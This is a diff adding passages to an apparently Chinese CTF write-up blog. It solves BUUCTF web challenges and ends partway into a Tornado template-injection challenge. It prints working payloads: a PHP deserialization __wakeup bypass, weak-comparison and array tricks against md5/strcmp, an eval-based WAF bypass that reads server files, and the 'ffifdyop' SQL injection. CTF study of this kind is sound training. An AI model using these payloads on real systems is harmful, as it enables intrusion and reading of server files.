@@ -196,3 +196,129 @@ class Name{
 ```
 
 反序列化时会首先执行 `__wakeup`，然后执行 `__destruct`，但是 `__wakeup` 里把 `username` 改成了 `guest`，所以 `__destruct` 里的 `if ($this->username === 'admin')` 正常情况下永远不会成立，所以这里要绕过 `__wakeup`，在反序列化时，当前属性个数大于实际属性个数时，就会跳过 `__wakeup`，但是这个似乎是 PHP 低版本的漏洞，用高版本的 PHP 复现不出来。
+
+```php
+<?php
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+ 
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+}
+$a = new Name('admin', 100);
+$b = urlencode(serialize($a));
+echo $b; 
+?>
+```
+
+出来一个 `O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`，urlencode 前是 `O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}`，所以把 2 改成 3 就行，最终的 payload 就是 `?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
+
+### [ACTF2020 新生赛]BackupFile
+
+wp 说用 dirsearch 嗯扫，我一通操作发现鸟蛋没扫出来，一看原来已经报 429 Too Many Requests，这 dirsearch 也是个笨比不知道歇会再扫。
+总之就是有个 `index.php.bak`，内容如下：
+
+```php
+<?php
+include_once "flag.php";
+
+if(isset($_GET['key'])) {
+    $key = $_GET['key'];
+    if(!is_numeric($key)) {
+        exit("Just num!");
+    }
+    $key = intval($key);
+    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
+    if($key == $str) {
+        echo $flag;
+    }
+}
+else {
+    echo "Try to find out source file!";
+}
+```
+
+php 里的 `==` 不要求类型相同，数字和混合字符串比较时，取最前面的一串数字，这里的 `str` 就只取 `123`，所以这里的 payload 是 `?key=123`。
+
+### [RoarCTF 2019]Easy Calc
+
+F12 看到说 `I've set up WAF to ensure security.`，WAF 是 Web Application Firewall 的缩写，就是一种防火墙。然后看到计算的过程是用 AJAX 发个包给 `calc.php` 去。直接访问 `calc.php`，内容如下：
+
+```php
+<?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET['num'];
+        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match('/' . $blackitem . '/m', $str)) {
+                        die("what are you want to do?");
+                }
+        }
+        eval('echo '.$str.';');
+}
+?>
+```
+
+然后发现 num 里面有字母时也会被 WAF 拦下来，比如 `?num=a` 时就不行，这时候就有个骚操作，可以在 `num` 前面加个空格或者 `+`，这样就能绕过 WAF 了，但是 PHP 在解析参数的时候会把空格或者 `+` 去掉。
+那么我们 `? num=var_dump(scandir(chr(47)))` 看下目录内容，为了绕过黑名单只能用 ASCII码，`chr(47)` 就是 `/`，也就是相当于 `ls /`，看到有个 `f1agg`，用 `file_get_contents` 读出来就行，payload 为 `? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))`。
+
+### [极客大挑战 2019]BuyFlag
+
+MENU 跳到 `pay.php`，F12 看到源码：
+
+```php
+if (isset($_POST['password'])) {
+    $password = $_POST['password'];
+    if (is_numeric($password)) {
+        echo "password can't be number</br>";
+    }elseif ($password == 404) {
+        echo "Password Right!</br>";
+    }
+}
+```
+
+又要 password 不是数字，又要 password 是 404，那还是 PHP 的弱类型比较，搞个 `404a` 传过去，发现没反应，根据他的要求再 POST 个 `money` 过去，还是没反应，看 wp 才发现有个 `user` 的 cookie 要改成 1，这时有反应了，说 `money` 太长。
+PHP 5.3 有个关于 `strcmp` 的漏洞，就是数据类型不同的时候，`strcmp` 会返回 0，所以这里的 payload 是 `?password=404a&money[]=1`，就是把 `money` 干成数组，就得到 flag了。
+
+### [BJDCTF2020]Easy MD5
+
+随便输个 `1`，一看响应头有个 hint：`Hint: select * from 'admin' where password=md5($pass,true)`，好，那就搞搞 MD5。
+首先 MD5 出来的是一个 128 位的散列值，然后 PHP 的 `md5` 函数后面的 `true` 是指返回二进制格式的散列值，但是这个二进制串会进行 ASCII 码转换成字符串，类似 python 里的 `str(long_to_bytes())`。
+wp 中选择了 `ffifdyop` 作为 payload，其 MD5 值为 `276f722736c95d99e921722cf9ed621c`，前面的 `27 6f 72 27 36` 对应的字符为 `'or'6`，这样就可以进行一个 SQL 注入，拼凑出 `select * from 'admin' where password=''or'6...'`，后面还会跟着一堆乱码，但是 `6...` 会被当成数字，所以就一定为真。
+然后跳到了 `levels91.php`，F12 看到：
+
+```php
+$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b && md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+```
+
+`$GET` 感觉是错的，真随意。后面的 if 语句有两种方法绕过，一种是找到两个不同的字符串，其 MD5 值都是 `0e` 后面跟数字，这样的话 PHP 会当成是科学计数法，其值都为 `0`，比如 `QNKCDZO` 和 `s878926199a`，传参进去后出现如下代码：
+
+```php
+<?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+}
+```
+
+这里就要用第二种方法了，就是传俩数组进去，`md5` 函数会返回 `null`，然后 `null` 和 `null` 比较时会返回 `true`，而且这个方法刚才也能用，即弱比较和强比较通杀。
+
+### [护网杯 2018]easy_tornado
+
+打开一看是个目录，有 `/flag.txt`，`/welcome.txt` 和 `hints.txt`，内容分别为 `flag in /fllllllllllllag`，`render` 和 `md5(cookie_secret+md5(filename))` 打开文件的时候 url 变成了 `/file?filename=/xxx.txt&filehash=xxx`，那我想看 flag 的话应该得搞到 flag 文件的 filehash，那首先得搞到 `cookie_secret`。
+题目名字中的 tornado 是一个 Python 的 web 框架，类似 Flask，那么题目是 SSTI 注入，即 Server-Side Template Injection，服务端模板注入。先只传 `filename` 不传 `filehash`，网页跳转到 `/error?msg=Error`，网页内容也是 `Error`，那么考虑对 `msg` 进行注入。
+小插曲：这时候太困睡觉去了，第二天再来搞这题时 BUU 在维护了，开摆！
